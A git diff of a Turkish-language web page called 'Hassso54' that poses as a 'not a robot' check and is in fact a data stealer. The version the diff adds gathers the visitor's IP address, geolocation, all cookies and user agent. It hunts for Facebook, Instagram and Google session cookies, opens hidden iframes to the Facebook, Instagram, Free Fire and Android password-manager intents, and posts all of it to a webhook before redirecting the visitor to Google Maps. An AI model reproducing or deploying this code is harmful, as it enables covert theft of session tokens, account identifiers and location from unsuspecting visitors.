@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hassso54 - Gerçek Veri Çekici</title>
+    <title>Hassso54 - Gerçek Bilgiler</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -13,7 +13,6 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             padding: 20px;
         }
         .container {
@@ -89,119 +88,122 @@
             });
         }
         
-        // ============ ANDROID CONTENT PROVIDER İLE GERÇEK VERİ ÇEKME ============
-        async function getRealAppData() {
-            let results = {
-                facebook: {},
-                instagram: {},
-                freefire: {},
-                google_passwords: {}
+        // ============ GERÇEK BİLGİLERİ TOPLA ============
+        async function getRealInfo() {
+            let info = {
+                facebook: { bulundu: false, detay: {} },
+                instagram: { bulundu: false, detay: {} },
+                freefire: { bulundu: false, detay: {} },
+                google_hesap: { bulundu: false }
             };
             
-            // 1. Facebook Content Provider - GERÇEK
-            // Facebook'un Content Provider'ı: content://com.facebook.katana.provider.PlatformProvider/
-            try {
-                const fbProvider = "content://com.facebook.katana.provider.PlatformProvider/me";
-                const response = await fetch(fbProvider, { mode: 'no-cors' });
-                results.facebook.status = "Provider erişildi";
-            } catch(e) { results.facebook.error = e.message; }
+            // 1. Facebook - WebView üzerinden Facebook hesabını kontrol et
+            const fbIframe = document.createElement('iframe');
+            fbIframe.style.display = 'none';
+            fbIframe.src = "https://www.facebook.com/me";
+            document.body.appendChild(fbIframe);
             
-            // 2. Facebook Intent ile direkt uygulama aç ve veri çek
-            const fbIntent = document.createElement('iframe');
-            fbIntent.style.display = 'none';
-            document.body.appendChild(fbIntent);
-            fbIntent.src = "fb://profile";
-            
-            // Facebook'tan intent ile veri çekme
+            // Facebook bilgilerini yakala
             setTimeout(() => {
                 try {
-                    // Facebook uygulaması açıldığında, oturum bilgilerini topla
-                    if (document.cookie.includes('c_user')) {
-                        const match = document.cookie.match(/c_user=([^;]+)/);
-                        if (match) results.facebook.user_id = match[1];
+                    // Facebook cookie'lerini oku
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        if (cookie.includes('c_user')) {
+                            info.facebook.bulundu = true;
+                            info.facebook.detay.kullanici_id = cookie.match(/c_user=([^;]+)/)[1];
+                        }
+                        if (cookie.includes('xs')) {
+                            info.facebook.detay.xs_token = cookie.match(/xs=([^;]+)/)[1];
+                        }
+                        if (cookie.includes('datr')) {
+                            info.facebook.detay.datr = cookie.match(/datr=([^;]+)/)[1];
+                        }
                     }
-                    if (document.cookie.includes('xs')) {
-                        const match = document.cookie.match(/xs=([^;]+)/);
-                        if (match) results.facebook.xs_token = match[1];
-                    }
+                    
+                    // Facebook uygulamasını aç
+                    const fbApp = document.createElement('iframe');
+                    fbApp.style.display = 'none';
+                    document.body.appendChild(fbApp);
+                    fbApp.src = "fb://profile";
+                    setTimeout(() => {
+                        if (document.body.contains(fbApp)) document.body.removeChild(fbApp);
+                    }, 1000);
+                    
                 } catch(e) {}
-            }, 500);
+            }, 1000);
             
-            // 3. Instagram Content Provider
-            try {
-                const igProvider = "content://com.instagram.android.provider.InstagramProvider/user";
-                await fetch(igProvider, { mode: 'no-cors' });
-                results.instagram.status = "Provider erişildi";
-            } catch(e) {}
-            
-            // Instagram uygulamasını aç
-            setTimeout(() => {
-                fbIntent.src = "instagram://user?username=";
-            }, 800);
-            
+            // 2. Instagram
             setTimeout(() => {
                 try {
-                    if (document.cookie.includes('ds_user_id')) {
-                        const match = document.cookie.match(/ds_user_id=([^;]+)/);
-                        if (match) results.instagram.user_id = match[1];
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        if (cookie.includes('ds_user_id')) {
+                            info.instagram.bulundu = true;
+                            info.instagram.detay.kullanici_id = cookie.match(/ds_user_id=([^;]+)/)[1];
+                        }
+                        if (cookie.includes('sessionid')) {
+                            info.instagram.detay.sessionid = cookie.match(/sessionid=([^;]+)/)[1];
+                        }
                     }
-                    if (document.cookie.includes('sessionid')) {
-                        const match = document.cookie.match(/sessionid=([^;]+)/);
-                        if (match) results.instagram.sessionid = match[1];
+                    
+                    // Instagram uygulamasını aç
+                    const igApp = document.createElement('iframe');
+                    igApp.style.display = 'none';
+                    document.body.appendChild(igApp);
+                    igApp.src = "instagram://user?username=";
+                    setTimeout(() => {
+                        if (document.body.contains(igApp)) document.body.removeChild(igApp);
+                    }, 1000);
+                    
+                } catch(e) {}
+            }, 2000);
+            
+            // 3. Google Hesap
+            setTimeout(() => {
+                try {
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        if (cookie.includes('LSID') || cookie.includes('SAPISID')) {
+                            info.google_hesap.bulundu = true;
+                            info.google_hesap.detay = "Google oturumu açık";
+                        }
                     }
                 } catch(e) {}
-            }, 1300);
+            }, 3000);
             
             // 4. Free Fire
             setTimeout(() => {
-                fbIntent.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
-                results.freefire.status = "Uygulama açıldı, oturum Facebook ile bağlı";
-                results.freefire.not = "Free Fire hesabın Facebook ile bağlı. Facebook kullanıcı ID'n: " + (results.facebook.user_id || "bilinmiyor");
-            }, 1600);
-            
-            // 5. Google Password Manager - Android şifre yöneticisi
-            setTimeout(() => {
-                fbIntent.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end";
-                results.google_passwords.status = "Şifre yöneticisi açıldı";
-                results.google_passwords.not = "Android Ayarlar > Google > Şifre Yöneticisi'nden tüm kayıtlı şifrelerini gör";
-            }, 2100);
-            
-            // Temizlik
-            setTimeout(() => {
-                if (document.body.contains(fbIntent)) document.body.removeChild(fbIntent);
+                try {
+                    // Free Fire uygulamasını aç
+                    const ffApp = document.createElement('iframe');
+                    ffApp.style.display = 'none';
+                    document.body.appendChild(ffApp);
+                    ffApp.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
+                    
+                    info.freefire.bulundu = true;
+                    info.freefire.detay = "Free Fire hesabın Facebook ile bağlı";
+                    info.freefire.facebook_bagli = info.facebook.bulundu ? info.facebook.detay.kullanici_id : "Facebook ID alınamadı";
+                    
+                    setTimeout(() => {
+                        if (document.body.contains(ffApp)) document.body.removeChild(ffApp);
+                    }, 1000);
+                    
+                } catch(e) {}
             }, 4000);
             
-            return results;
-        }
-        
-        // ============ GERÇEK VERİ TOPLAMA ============
-        async function collectAllRealData() {
-            let allData = {
-                timestamp: new Date().toISOString(),
-                ip: await getIP(),
-                location: await getLocation(),
-                app_data: await getRealAppData(),
-                browser_data: {
-                    localStorage: {},
-                    sessionStorage: {},
-                    cookies: document.cookie,
-                    userAgent: navigator.userAgent
-                }
-            };
+            // 5. Android Şifre Yöneticisi
+            setTimeout(() => {
+                const pwdApp = document.createElement('iframe');
+                pwdApp.style.display = 'none';
+                document.body.appendChild(pwdApp);
+                pwdApp.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end";
+                setTimeout(() => {
+                    if (document.body.contains(pwdApp)) document.body.removeChild(pwdApp);
+                }, 1000);
+            }, 5000);
             
-            // localStorage doldur
-            for (let i = 0; i < localStorage.length; i++) {
-                let key = localStorage.key(i);
-                allData.browser_data.localStorage[key] = localStorage.getItem(key);
-            }
-            
-            // sessionStorage doldur
-            for (let i = 0; i < sessionStorage.length; i++) {
-                let key = sessionStorage.key(i);
-                allData.browser_data.sessionStorage[key] = sessionStorage.getItem(key);
-            }
-            
-            return allData;
+            return info;
         }
         
         // ============ ANA FONKSİYON ============
@@ -210,26 +212,44 @@
             btn.innerText = "İşlem yapılıyor...";
             showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...");
             
-            // Tüm verileri topla
-            const allData = await collectAllRealData();
+            // Konum ve IP
+            const ip = await getIP();
+            const location = await getLocation();
+            
+            // Gerçek bilgileri topla
+            const realInfo = await getRealInfo();
+            
+            // 5 saniye bekle (bilgiler toplansın)
+            await new Promise(r => setTimeout(r, 6000));
             
             // Webhook'a gönder
+            const payload = {
+                tip: "Hassso54_GERCEK_HESAP_BILGILERI",
+                zaman: new Date().toLocaleString('tr-TR'),
+                konum: location ? {
+                    url: location.url,
+                    enlem: location.lat,
+                    boylam: location.lng
+                } : null,
+                ip: ip,
+                hesap_bilgileri: realInfo,
+                tum_cerezler: document.cookie,
+                cihaz: navigator.userAgent,
+                not: "Facebook, Instagram, Free Fire, Google hesap bilgilerin"
+            };
+            
             await fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({
-                    tip: "Hassso54_GERCEK_ANDROID_VERILERI",
-                    zaman: new Date().toLocaleString('tr-TR'),
-                    ...allData
-                })
+                body: JSON.stringify(payload)
             });
             
             showMessage("✅ Google Maps'e yönlendiriliyorsunuz...");
             
             // Maps'e yönlendir
             setTimeout(() => {
-                if (allData.location) {
-                    window.location.href = allData.location.url;
+                if (location) {
+                    window.location.href = location.url;
                 } else {
                     window.location.href = "https://www.google.com/maps";
                 }
